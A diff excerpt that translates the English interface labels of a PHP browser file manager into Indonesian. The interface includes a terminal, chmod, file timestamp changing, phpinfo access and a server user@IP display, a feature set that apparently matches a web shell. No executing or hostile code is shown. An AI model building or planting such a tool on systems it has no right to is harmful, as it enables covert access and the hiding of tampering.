             <button class="action-btn" onclick="openModal('grepModal')"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>Grep</button>
-            <button class="action-btn" onclick="openModal('linkToFileModal')"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"/></svg>Link to File</button>
-            <a href="?action=phpinfo" target="_blank" style="text-decoration:none;"><button class="action-btn" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15H9v-2h2v2zm0-4H9V7h2v6zm4-2h-2V7h2v6z"/></svg>PHP Info</button></a>
-            <button class="action-btn" onclick="openModal('aboutModal')"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M11,9H13V7H11M12,20C7.59,20 4,16.41 4,12C4,7.59 7.59,4 12,4C16.41,4 20,7.59 20,12C20,16.41 16.41,20 12,20M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M11,17H13V11H11V17Z"></path></svg>About</button>
+            <button class="action-btn" onclick="openModal('linkToFileModal')"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"/></svg>Tautkan ke File</button>
+            <a href="?action=phpinfo" target="_blank" style="text-decoration:none;"><button class="action-btn" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15H9v-2h2v2zm0-4H9V7h2v6zm4-2h-2V7h2v6z"/></svg>Info PHP</button></a>
+            <button class="action-btn" onclick="openModal('aboutModal')"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M11,9H13V7H11M12,20C7.59,20 4,16.41 4,12C4,7.59 7.59,4 12,4C16.41,4 20,7.59 20,12C20,16.41 16.41,20 12,20M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M11,17H13V11H11V17Z"></path></svg>Tentang</button>
         </div>
     </aside>
 
@@ -603,25 +610,25 @@ $server_info = [
                             ?>
                       </div>
                  </div>
-                 <div class="server-info" title="User@Server IP"><?= htmlspecialchars($server_info['user'] . '@' . $server_info['server_ip']) ?></div>
+                 <div class="server-info" title="Pengguna@IP Server"><?= htmlspecialchars($server_info['user'] . '@' . $server_info['server_ip']) ?></div>
                  <div class="header-actions">
                       <div class="view-toggle">
-                           <button id="list-view-btn" title="List View">&#9776;</button>
-                           <button id="grid-view-btn" title="Grid View">&#9638;</button>
+                           <button id="list-view-btn" title="Tampilan Daftar">&#9776;</button>
+                           <button id="grid-view-btn" title="Tampilan Grid">&#9638;</button>
                       </div>
-                      <span id="theme-toggle" title="Toggle Theme">&#127769;</span>
-                      <a href="?logout" class="logout-btn">Logout</a>
+                      <span id="theme-toggle" title="Ganti Tema">&#127769;</span>
+                      <a href="?logout" class="logout-btn">Keluar</a>
                  </div>
             </div>
             <div class="bottom-header-row">
                  <div class="header-nav-actions">
-                      <a href="?dir=<?= urlencode(SCRIPT_DIR) ?>" title="Home Directory"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg></a>
+                      <a href="?dir=<?= urlencode(SCRIPT_DIR) ?>" title="Direktori Beranda"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg></a>
                       <form id="go-to-path-form" class="form-group">
-                           <input type="text" name="path" placeholder="Go to path..." required value="<?= htmlspecialchars($dir) ?>">
-                           <button type="submit">Go</button>
+                           <input type="text" name="path" placeholder="Pergi ke path..." required value="<?= htmlspecialchars($dir) ?>">
+                           <button type="submit">Pergi</button>
                       </form>
-                      <form id="new-file-form" class="form-group"><input type="text" name="name" placeholder="New File..." required><button type="submit">Create</button></form>
-                      <form id="new-folder-form" class="form-group"><input type="text" name="name" placeholder="New Folder..." required><button type="submit">Create</button></form>
+                      <form id="new-file-form" class="form-group"><input type="text" name="name" placeholder="File Baru..." required><button type="submit">Buat</button></form>
+                      <form id="new-folder-form" class="form-group"><input type="text" name="name" placeholder="Folder Baru..." required><button type="submit">Buat</button></form>
                  </div>
             </div>
         </header>
@@ -629,10 +636,10 @@ $server_info = [
         <div class="content-wrapper">
             <div class="toolbar">
                 <div class="select-all">
-                    <input type="checkbox" id="select-all-checkbox" title="Select All">
-                    <label for="select-all-checkbox">Select All</label>
+                    <input type="checkbox" id="select-all-checkbox" title="Pilih Semua">
+                    <label for="select-all-checkbox">Pilih Semua</label>
                 </div>
-                <input type="search" id="search-box" placeholder="Search in this directory...">
+                <input type="search" id="search-box" placeholder="Cari di direktori ini...">
                 <div id="item-count" class="item-count"></div>
             </div>
         
@@ -641,54 +648,54 @@ $server_info = [
         </div>
     </main>
     
-    <button id="floating-terminal-btn" onclick="openModal('terminalModal')" title="Open Terminal (F1)">
+    <button id="floating-terminal-btn" onclick="openModal('terminalModal')" title="Buka Terminal (F1)">
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M20 4H4c-1.11 0-2 .9-2 2v12c0 1.1.89 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zM4 18V6h16v12H4zm2-7h3v2H6v-2zm4.5-2.5L9 10l1.5 1.5L12 10l-1.5-1.5zM13 13h5v2h-5v-2z"/></svg>
         <span>Terminal</span>
     </button>
     
     <div id="selection-toolbar">
-        <div class="selection-info"><span id="selection-count">0</span> items selected</div>
+        <div class="selection-info"><span id="selection-count">0</span> item terpilih</div>
         <div class="selection-actions">
-            <button title="Rename (F2)" id="selection-rename"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/></svg></button>
-            <button title="Change Permissions (F3)" id="selection-chmod"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M21.58,16.09L16,21.67L12.42,20.25L13.83,18.83L14.5,19.5L16,18L20.17,22.17L21.58,20.75L16,15.17L17.42,13.75L21.58,17.92V16.09M10,4H4C2.9,4 2,4.9 2,6V18C2,19.1 2.9,20 4,20H10V4Z"/></svg></button>
-            <button title="Change Time (F4)" id="selection-touch"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg></button>
-            <button title="Copy" id="selection-copy"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg></button>
-            <button title="Cut" id="selection-cut"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M9.64 7.64c.23-.5.36-1.05.36-1.64 0-2.21-1.79-4-4-4S2 3.79 2 6s1.79 4 4 4c.59 0 1.14-.13 1.64-.36L10 12l-2.36 2.36C7.14 14.13 6.59 14 6 14c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4c0-.59-.13-1.14-.36-1.64L12 14l7 7h3v-1L9.64 7.64zM6 8c-1.1 0-2-.89-2-2s.9-2 2-2 2 .89 2 2-.9 2-2 2zm0 12c-1.1 0-2-.89-2-2s.9-2 2-2 2 .89 2 2-.9 2-2 2zm6-7.5c-.28 0-.5-.22-.5-.5s.22-.5.5-.5.5.22.5.5-.22.5-.5.5zM19 3l-6 6h2v3.88l1.8-.72.4 1.68-3.2 1.28-3.2-1.28.4-1.68L13 11.88V8h2l6-6H19z"/></svg></button>
-            <button title="Paste" id="selection-paste" style="display: <?= isset($_SESSION['clipboard']) ? 'inline-block' : 'none' ?>"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 2h-4.18C14.4.84 13.3 0 12 0S9.6.84 9.18 2H5c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm7 18H5V4h2v3h10V4h2v16z"/></svg></button>
+            <button title="Ganti Nama (F2)" id="selection-rename"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/></svg></button>
+            <button title="Ubah Izin (F3)" id="selection-chmod"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M21.58,16.09L16,21.67L12.42,20.25L13.83,18.83L14.5,19.5L16,18L20.17,22.17L21.58,20.75L16,15.17L17.42,13.75L21.58,17.92V16.09M10,4H4C2.9,4 2,4.9 2,6V18C2,19.1 2.9,20 4,20H10V4Z"/></svg></button>
+            <button title="Ubah Waktu (F4)" id="selection-touch"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg></button>
+            <button title="Salin" id="selection-copy"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg></button>
+            <button title="Potong" id="selection-cut"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M9.64 7.64c.23-.5.36-1.05.36-1.64 0-2.21-1.79-4-4-4S2 3.79 2 6s1.79 4 4 4c.59 0 1.14-.13 1.64-.36L10 12l-2.36 2.36C7.14 14.13 6.59 14 6 14c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4c0-.59-.13-1.14-.36-1.64L12 14l7 7h3v-1L9.64 7.64zM6 8c-1.1 0-2-.89-2-2s.9-2 2-2 2 .89 2 2-.9 2-2 2zm0 12c-1.1 0-2-.89-2-2s.9-2 2-2 2 .89 2 2-.9 2-2 2zm6-7.5c-.28 0-.5-.22-.5-.5s.22-.5.5-.5.5.22.5.5-.22.5-.5.5zM19 3l-6 6h2v3.88l1.8-.72.4 1.68-3.2 1.28-3.2-1.28.4-1.68L13 11.88V8h2l6-6H19z"/></svg></button>
+            <button title="Tempel" id="selection-paste" style="display: <?= isset($_SESSION['clipboard']) ? 'inline-block' : 'none' ?>"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 2h-4.18C14.4.84 13.3 0 12 0S9.6.84 9.18 2H5c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm7 18H5V4h2v3h10V4h2v16z"/></svg></button>
             <button title="Zip" id="selection-zip"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M20 6h-8l-2-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-2 6h-2v2h2v2h-2v2h-2v-2h-2v-2h2v-2h-2v-2h2v2h2V8h2v4z"/></svg></button>
-            <button title="Delete" id="selection-delete" class="danger"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg></button>
+            <button title="Hapus" id="selection-delete" class="danger"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg></button>
         </div>
     </div>
 
     <div id="context-menu">
-        <button class="context-menu-item" id="ctx-preview"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>Preview</button>
+        <button class="context-menu-item" id="ctx-preview"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>Pratinjau</button>
         <button class="context-menu-item" id="ctx-edit"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>Edit</button>
-        <button class="context-menu-item" id="ctx-rename"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/></svg>Rename</button>
+        <button class="context-menu-item" id="ctx-rename"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/></svg>Ganti Nama</button>
         <button class="context-menu-item" id="ctx-chmod"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M21.58,16.09L16,21.67L12.42,20.25L13.83,18.83L14.5,19.5L16,18L20.17,22.17L21.58,20.75L16,15.17L17.42,13.75L21.58,17.92V16.09M10,4H4C2.9,4 2,4.9 2,6V18C2,19.1 2.9,20 4,20H10V4Z"/></svg>Chmod</button>
-        <button class="context-menu-item" id="ctx-touch"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>Change Time</button>
+        <button class="context-menu-item" id="ctx-touch"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>Ubah Waktu</button>
         <div class="context-menu-separator"></div>
-        <button class="context-menu-item" id="ctx-get-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"/></svg>Get Direct Link</button>
-        <button class="context-menu-item" id="ctx-copy"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>Copy</button>
-        <button class="context-menu-item" id="ctx-cut"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M9.64 7.64c.23-.5.36-1.05.36-1.64 0-2.21-1.79-4-4-4S2 3.79 2 6s1.79 4 4 4c.59 0 1.14-.13 1.64-.36L10 12l-2.36 2.36C7.14 14.13 6.59 14 6 14c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4c0-.59-.13-1.14-.36-1.64L12 14l7 7h3v-1L9.64 7.64zM6 8c-1.1 0-2-.89-2-2s.9-2 2-2 2 .89 2 2-.9 2-2 2zm0 12c-1.1 0-2-.89-2-2s.9-2 2-2 2 .89 2 2-.9 2-2 2zm6-7.5c-.28 0-.5-.22-.5-.5s.22-.5.5-.5.5.22.5.5-.22.5-.5.5zM19 3l-6 6h2v3.88l1.8-.72.4 1.68-3.2 1.28-3.2-1.28.4-1.68L13 11.88V8h2l6-6H19z"/></svg>Cut</button>
-        <button class="context-menu-item" id="ctx-paste"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 2h-4.18C14.4.84 13.3 0 12 0S9.6.84 9.18 2H5c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm7 18H5V4h2v3h10V4h2v16z"/></svg>Paste</button>
-        <button class="context-menu-item" id="ctx-duplicate"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M11 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v2h4v9a2 2 0 0 1-2 2h-7v2h-2v-2zm-5-9H4v2h2V6zM4 9h2v2H4V9zm5 0h2v2H9V9zM9 6h2v2H9V6zm-2 6H5a2 2 0 0 1-2-2V5h1v7a1 1 0 0 0 1 1h7v1a1 1 0 0 0 1-1v-1h-1a2 2 0 0 1-2-2z"/></svg>Duplicate</button>
-        <button class="context-menu-item" id="ctx-extract"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2zm4 12h-2v-2h2v-2h-2v-2h2v-2h-4v10h4z"/></svg>Extract</button>
+        <button class="context-menu-item" id="ctx-get-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"/></svg>Tautan Langsung</button>
+        <button class="context-menu-item" id="ctx-copy"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>Salin</button>
+        <button class="context-menu-item" id="ctx-cut"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M9.64 7.64c.23-.5.36-1.05.36-1.64 0-2.21-1.79-4-4-4S2 3.79 2 6s1.79 4 4 4c.59 0 1.14-.13 1.64-.36L10 12l-2.36 2.36C7.14 14.13 6.59 14 6 14c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4c0-.59-.13-1.14-.36-1.64L12 14l7 7h3v-1L9.64 7.64zM6 8c-1.1 0-2-.89-2-2s.9-2 2-2 2 .89 2 2-.9 2-2 2zm0 12c-1.1 0-2-.89-2-2s.9-2 2-2 2 .89 2 2-.9 2-2 2zm6-7.5c-.28 0-.5-.22-.5-.5s.22-.5.5-.5.5.22.5.5-.22.5-.5.5zM19 3l-6 6h2v3.88l1.8-.72.4 1.68-3.2 1.28-3.2-1.28.4-1.68L13 11.88V8h2l6-6H19z"/></svg>Potong</button>
+        <button class="context-menu-item" id="ctx-paste"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M19 2h-4.18C14.4.84 13.3 0 12 0S9.6.84 9.18 2H5c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm7 18H5V4h2v3h10V4h2v16z"/></svg>Tempel</button>
+        <button class="context-menu-item" id="ctx-duplicate"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M11 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v2h4v9a2 2 0 0 1-2 2h-7v2h-2v-2zm-5-9H4v2h2V6zM4 9h2v2H4V9zm5 0h2v2H9V9zM9 6h2v2H9V6zm-2 6H5a2 2 0 0 1-2-2V5h1v7a1 1 0 0 0 1 1h7v1a1 1 0 0 0 1-1v-1h-1a2 2 0 0 1-2-2z"/></svg>Duplikat</button>
+        <button class="context-menu-item" id="ctx-extract"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2zm4 12h-2v-2h2v-2h-2v-2h2v-2h-4v10h4z"/></svg>Ekstrak</button>
         <div class="context-menu-separator"></div>
-        <button class="context-menu-item" id="ctx-properties"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M11 17h2v-6h-2v6zm1-15C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zM11 9h2V7h-2v2z"/></svg>Properties</button>
-        <button class="context-menu-item" id="ctx-delete" style="color:#ff0016"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>Delete</button>
+        <button class="context-menu-item" id="ctx-properties"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M11 17h2v-6h-2v6zm1-15C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zM11 9h2V7h-2v2z"/></svg>Properti</button>
+        <button class="context-menu-item" id="ctx-delete" style="color:#ff0016"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>Hapus</button>
     </div>
 
-    <div id="editorModal" class="modal"><div class="modal-content modal-lg"><div class="modal-header"><h3 class="modal-title" id="editor-title">Editor</h3><div class="modal-header-actions"><button id="editor-font-decrease" class="header-btn" title="Decrease font size">A-</button><button id="editor-font-increase" class="header-btn" title="Increase font size">A+</button><button id="editor-fullscreen-btn" class="header-btn" title="Toggle Fullscreen"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"/></svg></button><button class="modal-close" onclick="closeModal('editorModal')">&times;</button></div></div><form id="editor-form" style="display: contents;"><input type="hidden" id="edit-path" name="path"><div id="editor-container"><textarea id="code-editor" name="content"></textarea></div><div class="modal-actions" id="editor-actions"><button type="button" class="btn-cancel" onclick="closeModal('editorModal')">Cancel</button><button type="submit" class="btn-save">Save</button></div></form></div></div>
-    <div id="chmodModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Change Permissions</h3><button class="modal-close" onclick="closeModal('chmodModal')">&times;</button></div><div class="modal-body"><form id="chmod-form" class="modal-form"><p id="chmod-info" style="margin-bottom:10px; color:var(--text-secondary);"></p><input type="text" id="chmod-mode" name="mode" required><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('chmodModal')">Cancel</button><button type="submit" class="btn-submit">Set</button></div></form></div></div></div>
-    <div id="renameModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Rename</h3><button class="modal-close" onclick="closeModal('renameModal')">&times;</button></div><div class="modal-body"><form id="rename-form" class="modal-form"><input type="text" id="rename-new-name" name="new_name" required><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('renameModal')">Cancel</button><button type="submit" class="btn-submit">Rename</button></div></form></div></div></div>
-    <div id="touchModal" class="modal"><div class="modal-content"><div class="modal-header"><h3 class="modal-title">Change Timestamp</h3><button class="modal-close" onclick="closeModal('touchModal')">&times;</button></div><div class="modal-body"><form id="touch-form" class="modal-form"><p style="margin-bottom:10px; color:var(--text-secondary);">Enter the new modification date and time.</p><input type="text" id="touch-datetime" name="datetime" required placeholder="YYYY-MM-DD HH:MM:SS"><div class="modal-actions"><button type="button" class="btn-cancel" onclick="closeModal('touchModal')">Cancel</button><button type="submit" class="btn-submit">Set</button></div></form></div></div></div>
